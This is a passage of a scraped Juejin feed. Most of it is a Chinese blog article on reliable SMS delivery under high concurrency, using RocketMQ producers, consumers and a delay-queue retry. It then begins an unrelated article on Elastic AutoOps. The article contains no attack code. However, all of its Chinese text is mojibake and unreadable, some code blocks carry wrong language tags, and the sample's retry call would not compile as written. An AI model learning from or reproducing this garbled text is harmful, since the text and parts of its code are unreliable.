                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ğŸš€ åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹åŸºäºMQå®ç°å¯é çŸ­ä¿¡å‘é€æœºåˆ¶</h2>
<blockquote>
<p>ä½œè€…ï¼šå¤©å¤©æ‘¸é±¼çš„javaå·¥ç¨‹å¸ˆ Â· 8å¹´ç»éªŒ<br/>
æ ‡ç­¾ï¼šJava Â· RocketMQ/Kafka Â· é«˜å¹¶å‘ Â· æ¶ˆæ¯é‡è¯• Â· æ¶æ„è®¾è®¡ Â· åˆ†å¸ƒå¼å¯é æ€§</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">ğŸ“Œ èƒŒæ™¯åœºæ™¯</h3>
<p>åœ¨å®é™…çš„ä¸šåŠ¡ç³»ç»Ÿä¸­ï¼ŒçŸ­ä¿¡é€šçŸ¥æ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„éæ ¸å¿ƒä½†åˆå…³é”®çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>ç”¨æˆ·æ³¨å†Œ/ç™»å½•æ—¶å‘é€éªŒè¯ç </li>
<li>è®¢å•æ”¯ä»˜æˆåŠŸé€šçŸ¥ç”¨æˆ·</li>
<li>æ´»åŠ¨è¥é”€ã€ä¼˜æƒ åˆ¸æé†’ç­‰</li>
</ul>
<p><strong>çŸ­ä¿¡æœåŠ¡å±äºå¼ºä¾èµ–å¤–éƒ¨æœåŠ¡çš„éç¡®å®šæ€§æ“ä½œ</strong>ï¼Œå¯èƒ½å› ä¸ºç¬¬ä¸‰æ–¹ç½‘å…³ä¸ç¨³å®šã€ç½‘ç»œæŠ–åŠ¨ã€é™æµç­‰åŸå› å¯¼è‡´å¤±è´¥ã€‚å¦‚æœä½ æŠŠçŸ­ä¿¡å‘é€é€»è¾‘ç›´æ¥å†™åœ¨ä¸šåŠ¡æµç¨‹å†…ï¼Œé‚£ä¹ˆä¸€æ—¦çŸ­ä¿¡æœåŠ¡æŒ‚äº†ï¼Œæ•´ä¸ªä¸šåŠ¡é“¾å°±ä¼šå—åˆ°å½±å“ï¼Œè¿™æ˜¯éå¸¸ä¸å¯é çš„ã€‚</p>
<hr/>
<h3 data-id="heading-2">ğŸ§  è®¾è®¡ç›®æ ‡</h3>
<p>æˆ‘ä»¬å¸Œæœ›å®ç°ä¸€ä¸ªå…·å¤‡ä»¥ä¸‹èƒ½åŠ›çš„çŸ­ä¿¡å‘é€ç³»ç»Ÿï¼š</p>
<ol>
<li><strong>å¼‚æ­¥è§£è€¦</strong>ï¼šä¸šåŠ¡ç³»ç»Ÿä¸è¢«çŸ­ä¿¡æœåŠ¡å½±å“ï¼›</li>
<li><strong>å¯é æ¶ˆæ¯æŠ•é€’</strong>ï¼šçŸ­ä¿¡å¤±è´¥åæ”¯æŒè‡ªåŠ¨é‡è¯•ï¼›</li>
<li><strong>é«˜å¹¶å‘æ”¯æ’‘</strong>ï¼šèƒ½æ‰¿å—ç™¾ä¸‡çº§å¹¶å‘æ¶ˆæ¯æµï¼›</li>
<li><strong>å¯è§‚æµ‹æ€§å¼º</strong>ï¼šæ–¹ä¾¿æ’æŸ¥å¤±è´¥æ¶ˆæ¯ã€æŸ¥çœ‹çŠ¶æ€ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-3">ğŸ—ï¸ æ¶æ„è®¾è®¡</h3>
<p>æ•´ä½“æ¶æ„å¦‚ä¸‹å›¾ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[ä¸šåŠ¡æœåŠ¡]</span> ---&gt; <span class="hljs-selector-attr">[MQ Topic: sms-topic]</span> ---&gt; <span class="hljs-selector-attr">[çŸ­ä¿¡æ¶ˆè´¹è€…æœåŠ¡]</span> ---&gt; <span class="hljs-selector-attr">[çŸ­ä¿¡ç½‘å…³]</span>
                          â†‘
                    <span class="hljs-selector-attr">[å¤±è´¥æ¶ˆæ¯é‡è¯•é˜Ÿåˆ—]</span>
</code></pre>
<h4 data-id="heading-4">æ¶ˆæ¯æµè½¬è¯´æ˜ï¼š</h4>
<ol>
<li>ä¸šåŠ¡æœåŠ¡å°†çŸ­ä¿¡æ¶ˆæ¯å‘é€åˆ° <strong>MQï¼ˆå¦‚ RocketMQ/Kafkaï¼‰</strong> ï¼›</li>
<li>çŸ­ä¿¡æ¶ˆè´¹è€…å¼‚æ­¥æ¶ˆè´¹æ¶ˆæ¯ï¼Œè°ƒç”¨çŸ­ä¿¡ç½‘å…³æ¥å£å‘é€ï¼›</li>
<li>è‹¥å‘é€å¤±è´¥ï¼ˆå¦‚ç¬¬ä¸‰æ–¹æ¥å£å¼‚å¸¸ï¼‰ï¼Œå°†æ¶ˆæ¯é‡æ–°æŠ•é€’åˆ°å»¶è¿Ÿé˜Ÿåˆ—æˆ– DeadLetter Queueï¼›</li>
<li>ç³»ç»Ÿæ ¹æ®é‡è¯•ç­–ç•¥è¿›è¡Œè¡¥å‘ï¼Œæœ€å¤§é‡è¯•æ¬¡æ•°åä»å¤±è´¥åˆ™è®°å½•æ—¥å¿—/äººå·¥å‘Šè­¦ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-5">ğŸ§ª æ ¸å¿ƒä»£ç å®ç°ï¼ˆåŸºäº RocketMQï¼‰</h3>
<h4 data-id="heading-6">1. æ¶ˆæ¯ç”Ÿäº§è€…å‘é€çŸ­ä¿¡ä»»åŠ¡</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsProducer</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DefaultMQProducer producer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SmsProducer</span><span class="hljs-params">(String producerGroup)</span> <span class="hljs-keyword">throws</span> MQClientException {
        producer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(producerGroup);
        producer.setNamesrvAddr(<span class="hljs-string">"localhost:9876"</span>);
        producer.start();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendSmsMessage</span><span class="hljs-params">(SmsMessage smsMessage)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(<span class="hljs-string">"sms-topic"</span>, 
            smsMessage.getBizType(), 
            JSONObject.toJSONString(smsMessage).getBytes(StandardCharsets.UTF_8));
        message.setDelayTimeLevel(<span class="hljs-number">0</span>); <span class="hljs-comment">// ç«‹å³å‘é€</span>

        <span class="hljs-type">SendResult</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> producer.send(message);
        log.info(<span class="hljs-string">"æ¶ˆæ¯å‘é€æˆåŠŸï¼š{}"</span>, result);
    }
}
</code></pre>
<h4 data-id="heading-7">2. æ¶ˆè´¹è€…æ¥æ”¶å¹¶å‘é€çŸ­ä¿¡</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@RocketMQMessageListener</span>(topic = <span class="hljs-string">"sms-topic"</span>, consumerGroup = <span class="hljs-string">"sms-consumer"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SmsConsumer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RocketMQListener</span>&lt;<span class="hljs-title class_">String</span>&gt; {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">SmsGatewayClient</span> smsGateway;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RetryProducer</span> retryProducer;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">onMessage</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> messageStr</span>) {
        <span class="hljs-title class_">SmsMessage</span> sms = <span class="hljs-title class_">JSON</span><span class="hljs-built_in">Object</span>.<span class="hljs-title function_">parseObject</span>(messageStr, <span class="hljs-title class_">SmsMessage</span>.<span class="hljs-property">class</span>);
        <span class="hljs-keyword">try</span> {
            <span class="hljs-built_in">boolean</span> success = smsGateway.<span class="hljs-title function_">send</span>(sms);
            <span class="hljs-keyword">if</span> (!success) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"çŸ­ä¿¡å‘é€å¤±è´¥"</span>);
            }
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
            log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"çŸ­ä¿¡å‘é€å¼‚å¸¸ï¼š{}"</span>, e.<span class="hljs-title function_">getMessage</span>());
            retryProducer.<span class="hljs-title function_">sendRetryMessage</span>(sms); <span class="hljs-comment">// å‘é€åˆ°é‡è¯•é˜Ÿåˆ—</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-8">3. é‡è¯•é˜Ÿåˆ—é€»è¾‘ï¼ˆå»¶è¿Ÿé˜Ÿåˆ—ï¼‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RetryProducer</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> DefaultMQProducer retryProducer;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RetryProducer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> MQClientException {
        retryProducer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(<span class="hljs-string">"sms-retry-group"</span>);
        retryProducer.setNamesrvAddr(<span class="hljs-string">"localhost:9876"</span>);
        retryProducer.start();
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendRetryMessage</span><span class="hljs-params">(SmsMessage smsMessage)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-keyword">if</span> (smsMessage.getRetryCount() &gt;= <span class="hljs-number">3</span>) {
            log.warn(<span class="hljs-string">"çŸ­ä¿¡é‡è¯•è¶…è¿‡æœ€å¤§æ¬¡æ•°ï¼Œè®°å½•æ—¥å¿—å‘Šè­¦ï¼š{}"</span>, smsMessage);
            <span class="hljs-keyword">return</span>;
        }

        smsMessage.setRetryCount(smsMessage.getRetryCount() + <span class="hljs-number">1</span>);
        <span class="hljs-type">Message</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(<span class="hljs-string">"sms-topic"</span>, 
            smsMessage.getBizType(), 
            JSONObject.toJSONString(smsMessage).getBytes(StandardCharsets.UTF_8));

        message.setDelayTimeLevel(<span class="hljs-number">3</span>); <span class="hljs-comment">// å»¶è¿Ÿ10så†é‡è¯•ï¼ˆRocketMQå†…ç½®çš„å»¶è¿Ÿç­‰çº§ï¼‰</span>
        retryProducer.send(message);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-9">âš™ï¸ é«˜å¹¶å‘å¤„ç†å»ºè®®</h3>
<h4 data-id="heading-10">1. <strong>ä¸šåŠ¡å±‚å¼‚æ­¥è§£è€¦</strong></h4>
<p>ä½¿ç”¨ MQ å®Œå…¨è„±ç¦»ä¸»ä¸šåŠ¡é“¾è·¯ï¼Œä¸šåŠ¡å“åº”æ—¶é—´æ›´çŸ­ï¼š</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// æ¥å£å“åº”æ— éœ€ç­‰å¾…çŸ­ä¿¡å‘é€å®Œæˆ</span>
smsProducer<span class="hljs-selector-class">.sendSmsMessageAsync</span>(smsMessage);
</code></pre>
<h4 data-id="heading-11">2. <strong>æ¶ˆè´¹è€…æ°´å¹³æ‰©å±•</strong></h4>
<p>RocketMQ/Kafka éƒ½æ”¯æŒ <strong>å¤šä¸ªæ¶ˆè´¹è€…å®ä¾‹å¹¶å‘æ¶ˆè´¹</strong>ï¼Œé€šè¿‡éƒ¨ç½²å¤šä¸ªå®ä¾‹æ¥æå‡ååé‡ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">replicaCount:</span> <span class="hljs-number">5</span>  <span class="hljs-comment"># Kuberneteséƒ¨ç½²å¤šä¸ªå‰¯æœ¬æ¶ˆè´¹çŸ­ä¿¡é˜Ÿåˆ—</span>
</code></pre>
<h4 data-id="heading-12">3. <strong>çŸ­ä¿¡ç½‘å…³å¼‚æ­¥å¹¶å‘å‘é€</strong></h4>
<p>å¦‚æœä½¿ç”¨ç¬¬ä¸‰æ–¹ SDKï¼Œå¯ä»¥ä½¿ç”¨çº¿ç¨‹æ± è¿›è¡Œå¼‚æ­¥å‘é€ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">10</span>)<span class="hljs-comment">;</span>
executor.submit(() -&gt; smsGateway.send(sms))<span class="hljs-comment">;</span>
</code></pre>
<hr/>
<h3 data-id="heading-13">ğŸ“ˆ å¯è§‚æµ‹æ€§ä¸ç›‘æ§</h3>
<ul>
<li><strong>å¤±è´¥æ¶ˆæ¯å…¥åº“</strong>ï¼šè®°å½•å¤±è´¥åŸå› ã€é‡è¯•æ¬¡æ•°ã€æœ€ç»ˆçŠ¶æ€ï¼›</li>
<li><strong>Prometheus + Grafana</strong>ï¼šç›‘æ§çŸ­ä¿¡å‘é€æˆåŠŸç‡ã€MQå †ç§¯æƒ…å†µï¼›</li>
<li><strong>æŠ¥è­¦æœºåˆ¶</strong>ï¼šçŸ­ä¿¡å¤±è´¥ç‡è¶…è¿‡é˜ˆå€¼è‡ªåŠ¨æŠ¥è­¦ï¼›</li>
</ul>
<hr/>
<h3 data-id="heading-14">âœ… æ€»ç»“</h3>
<p>é€šè¿‡ MQ è§£è€¦å’Œå¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œæˆ‘ä»¬ä¸ä»…æå‡äº†ç³»ç»Ÿçš„ <strong>ç¨³å®šæ€§å’Œå¯ç”¨æ€§</strong>ï¼Œè¿˜å…·å¤‡äº†åº”å¯¹ <strong>é«˜å¹¶å‘ã€å¯é‡è¯•ã€å¯è§‚æµ‹</strong> çš„èƒ½åŠ›ã€‚ç»éªŒå‘Šè¯‰æˆ‘ä»¬ï¼š</p>
<ul>
<li><strong>å¤–éƒ¨æœåŠ¡ä¸€å®šè¦éš”ç¦»ï¼Œä¸èƒ½å½±å“ä¸»ä¸šåŠ¡é“¾è·¯</strong></li>
<li><strong>ä¸€å®šè¦æœ‰é‡è¯•æœºåˆ¶å’Œå¤±è´¥å‘Šè­¦</strong></li>
<li><strong>ç³»ç»Ÿè¶Šå¤§ï¼Œè¶Šè¦æ³¨é‡æ¯ä¸€ç¯çš„å¯é æ€§è®¾è®¡</strong></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AutoOps å®é™…åº”ç”¨ï¼šè°ƒæŸ¥ ECK ä¸Šçš„ Elasticsearch é›†ç¾¤æ€§èƒ½]]></title>    <link>https://juejin.cn/post/7581689310644174890</link>    <guid>https://juejin.cn/post/7581689310644174890</guid>    <pubDate>2025-12-10T01:36:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581689310644174890" data-draft-id="7581693431740678207" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AutoOps å®é™…åº”ç”¨ï¼šè°ƒæŸ¥ ECK ä¸Šçš„ Elasticsearch é›†ç¾¤æ€§èƒ½"/> <meta itemprop="keywords" content="Elasticsearch"/> <meta itemprop="datePublished" content="2025-12-10T01:36:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Elasticsearch"/> <meta itemprop="url" content="https://juejin.cn/user/2612095360441448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AutoOps å®é™…åº”ç”¨ï¼šè°ƒæŸ¥ ECK ä¸Šçš„ Elasticsearch é›†ç¾¤æ€§èƒ½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2612095360441448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Elasticsearch
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:36:02.000Z" title="Wed Dec 10 2025 01:36:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½œè€…ï¼šæ¥è‡ª ElasticÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fsearch-labs%2Fauthor%2Faram-favela" title="https://www.elastic.co/search-labs/author/aram-favela" target="_blank" ref="nofollow noopener noreferrer">Aram Favela</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a551f3d19da4108862413d81dedbf8b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxhc3RpY3NlYXJjaA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765935361&amp;x-signature=IyiSUbEDe475Fqgxrp1U%2FyOh%2BVA%3D" alt="" loading="lazy"/></p>
<p>äº†è§£ Elastic çš„ InfoSec å›¢é˜Ÿå¦‚ä½•åœ¨å¤šé›†ç¾¤ ECK ç¯å¢ƒä¸­å®æ–½ AutoOpsï¼Œå°†é›†ç¾¤æ€§èƒ½è°ƒæŸ¥æ—¶é—´ä» 30 å¤šåˆ†é’Ÿå‡å°‘åˆ°äº”åˆ†é’Ÿã€‚</p>
<p>é€šè¿‡å®æ—¶é—®é¢˜æ£€æµ‹å’Œå¯æ“ä½œçš„å»ºè®®æ¥ä¼˜åŒ–æ€§èƒ½å¹¶é™ä½æˆæœ¬ï¼Œä»è€Œç®€åŒ–ä½ çš„ Elasticsearch è¿ç»´ã€‚AutoOps å¯ç”¨äº cloud å’Œ self-managed éƒ¨ç½²ã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.elastic.co%2Fplatform%2Fautoops" title="https://www.elastic.co/platform/autoops" target="_blank" ref="nofollow noopener noreferrer">äº†è§£æ›´å¤šå…³äº AutoOps çš„ä¿¡æ¯</a>ã€‚</p>
<hr/>
